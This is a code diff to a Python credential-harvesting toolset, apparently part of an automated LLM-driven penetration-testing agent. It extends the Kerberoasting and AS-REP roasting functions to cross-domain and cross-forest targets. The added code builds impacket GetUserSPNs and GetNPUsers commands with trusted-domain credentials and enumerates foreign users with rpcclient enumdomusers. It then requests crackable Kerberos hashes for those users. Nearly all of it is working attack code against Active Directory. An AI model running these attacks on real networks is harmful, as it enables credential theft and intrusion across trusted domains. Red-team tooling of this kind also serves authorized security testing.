@@ -240,8 +240,8 @@ class CredentialHarvestingTools(Toolset):
                     logger.info(f"Domain corrected from target FQDN: {domain} -> {derived_domain}")
                 domain = derived_domain
 
-        if self.state and hasattr(self.state, "add_domain") and domain:
-            self.state.add_domain(domain)
+        # Don't register domain from LLM parameters — secretsdump output contains
+        # authoritative domain names that get registered via add_credential/add_hash.
 
         if not skip_connectivity_check:
             is_reachable, error_msg = self._check_smb_connectivity(target)
@@ -338,6 +338,7 @@ class CredentialHarvestingTools(Toolset):
         username: str,
         password: str,
         dc_ip: str,
+        credential_domain: str | None = None,
     ) -> str:
         """
         Perform Kerberoasting attack to extract service account password hashes.
@@ -347,31 +348,60 @@ class CredentialHarvestingTools(Toolset):
         obtain service account passwords, which often have elevated privileges.
 
         Args:
-            domain: Target domain (e.g., 'contoso.local')
+            domain: Target domain to enumerate SPNs in (e.g., 'contoso.local')
             username: Valid domain username
             password: Password for the username
             dc_ip: Domain controller IP address
+            credential_domain: Domain the credential belongs to, if different from target domain.
+                Use this for cross-domain/cross-forest enumeration when your credential
+                is from a trusted domain (e.g., credential_domain='contoso.local' to
+                enumerate SPNs in domain='fabrikam.local' via forest trust).
 
         Returns:
             Kerberos TGS hashes for service accounts that can be cracked offline
 
         Example:
             >>> kerberoast("contoso.local", "user", "pass", "192.168.58.100")
+            >>> kerberoast("fabrikam.local", "user", "pass", "192.168.58.200", credential_domain="contoso.local")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
             return "[!] Refusing to use placeholder password; provide a real credential."
 
+        # Auto-detect cross-domain: check if the credential belongs to a different domain
+        if not credential_domain and self.state and username:
+            for cred in getattr(self.state, "all_credentials", []) or getattr(
+                self.state, "credentials", []
+            ):
+                if (
+                    cred.username.lower() == username.lower()
+                    and cred.password
+                    and (cred.domain or "").lower() != domain.lower()
+                    and (cred.domain or "")
+                ):
+                    credential_domain = cred.domain
+                    logger.info(
+                        f"[*] Auto-detected cross-domain: {username} belongs to "
+                        f"{credential_domain}, not {domain}"
+                    )
+                    break
+
+        auth_domain = credential_domain or domain
         cmd = [
             "impacket-GetUserSPNs",
-            f"{domain}/{username}:{resolved_password}",
+            f"{auth_domain}/{username}:{resolved_password}",
             "-dc-ip",
             dc_ip,
             "-request",
         ]
+        if credential_domain and credential_domain.lower() != domain.lower():
+            cmd.extend(["-target-domain", domain])
 
         try:
-            logger.info(f"[*] Kerberoasting {domain} using {username}")
+            logger.info(
+                f"[*] Kerberoasting {domain} using {username}"
+                + (f" (cred domain: {credential_domain})" if credential_domain else "")
+            )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
             output = (stdout or "") + ("\n" + stderr if stderr else "")
 
@@ -474,8 +504,6 @@ class CredentialHarvestingTools(Toolset):
                 ]
 
             logger.info(f"[*] Kerberos user recon (no-auth) against {domain} via {dc_ip}")
-            if self.state and hasattr(self.state, "add_domain"):
-                self.state.add_domain(domain)
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)
             output = (stdout or "") + ("\n" + stderr if stderr else "")
 
@@ -555,6 +583,7 @@ class CredentialHarvestingTools(Toolset):
         username: str,
         password: str,
         dc_ip: str,
+        credential_domain: str | None = None,
     ) -> str:
         """
         Perform AS-REP roasting attack to find users without Kerberos pre-authentication.
@@ -564,31 +593,118 @@ class CredentialHarvestingTools(Toolset):
         cracked offline to obtain user passwords.
 
         Args:
-            domain: Target domain (e.g., 'contoso.local')
+            domain: Target domain to enumerate (e.g., 'contoso.local')
             username: Valid domain username (for recon)
             password: Password for the username
             dc_ip: Domain controller IP address
+            credential_domain: Domain the credential belongs to, if different from target domain.
+                Use this for cross-domain/cross-forest enumeration when your credential
+                is from a trusted domain (e.g., credential_domain='contoso.local' to
+                find AS-REP roastable users in domain='fabrikam.local' via forest trust).
 
         Returns:
             AS-REP hashes for vulnerable user accounts
 
         Example:
             >>> asrep_roast("contoso.local", "user", "pass", "192.168.58.100")
+            >>> asrep_roast("fabrikam.local", "user", "pass", "192.168.58.200", credential_domain="contoso.local")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
             return "[!] Refusing to use placeholder password; provide a real credential."
 
-        cmd = [
-            "impacket-GetNPUsers",
-            f"{domain}/{username}:{resolved_password}",
-            "-dc-ip",
-            dc_ip,
-            "-request",
-        ]
+        # Auto-detect cross-domain: check if the credential belongs to a different domain
+        if not credential_domain and self.state and username:
+            for cred in getattr(self.state, "all_credentials", []) or getattr(
+                self.state, "credentials", []
+            ):
+                if (
+                    cred.username.lower() == username.lower()
+                    and cred.password
+                    and (cred.domain or "").lower() != domain.lower()
+                    and (cred.domain or "")
+                ):
+                    credential_domain = cred.domain
+                    logger.info(
+                        f"[*] Auto-detected cross-domain: {username} belongs to "
+                        f"{credential_domain}, not {domain}"
+                    )
+                    break
+
+        is_cross_domain = credential_domain and credential_domain.lower() != domain.lower()
 
         try:
-            logger.info(f"[*] AS-REP roasting {domain} using {username}")
+            if is_cross_domain:
+                # GetNPUsers doesn't support -target-domain in current impacket.
+                # Workaround: enumerate users via GetADUsers with trust creds,
+                # then AS-REP roast with the userlist (no-pass).
+                logger.info(
+                    f"[*] Cross-domain AS-REP roast: enumerating {domain} users via "
+                    f"{credential_domain}/{username} trust, then AS-REP roasting"
+                )
+                # Use rpcclient enumdomusers for cross-forest user enum
+                # (GetADUsers and GetNPUsers lack -target-domain in this impacket)
+                enum_cmd = [
+                    "rpcclient",
+                    "-U",
+                    f"{credential_domain}/{username}%{resolved_password}",
+                    dc_ip,
+                    "-c",
+                    "enumdomusers",
+                ]
+                enum_stdout, enum_stderr, _enum_rc = run_tool(enum_cmd, timeout_seconds=30)
+                enum_output = (enum_stdout or "") + (enum_stderr or "")
+                # Parse rpcclient enumdomusers output: "user:[username] rid:[0xNNN]"
+                foreign_users: list[str] = []
+                for raw_line in enum_output.split("\n"):
+                    stripped = raw_line.strip()
+                    if stripped.startswith("user:["):
+                        # Extract username between user:[ and ]
+                        user_part = stripped.split("user:[", 1)[1].split("]", 1)[0]
+                        if user_part:
+                            foreign_users.append(user_part)
+                if not foreign_users:
+                    return (
+                        f"[!] Cross-domain user enumeration returned no users for {domain}. "
+                        f"GetADUsers output:\n{enum_output}"
+                    )
+                # Add discovered users to state for other agents to leverage
+                if self.state and hasattr(self.state, "add_user"):
+                    for fu in foreign_users:
+                        self.state.add_user(fu, domain, f"cross_domain_enum@{dc_ip}")
+                logger.info(
+                    f"[*] Discovered {len(foreign_users)} users in {domain}, AS-REP roasting..."
+                )
+                import tempfile
+
+                with tempfile.NamedTemporaryFile(
+                    mode="w", suffix=".txt", prefix="ares-crossdomain-users-", delete=False
+                ) as f:
+                    f.write("\n".join(foreign_users) + "\n")
+                    userfile = f.name
+                cmd = [
+                    "impacket-GetNPUsers",
+                    f"{domain}/",
+                    "-usersfile",
+                    userfile,
+                    "-dc-ip",
+                    dc_ip,
+                    "-no-pass",
+                    "-request",
+                ]
+            else:
+                cmd = [
+                    "impacket-GetNPUsers",
+                    f"{domain}/{username}:{resolved_password}",
+                    "-dc-ip",
+                    dc_ip,
+                    "-request",
+                ]
+
+            logger.info(
+                f"[*] AS-REP roasting {domain} using {username}"
+                + (f" (cred domain: {credential_domain})" if credential_domain else "")
+            )
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
             output = stdout or stderr or ""
 
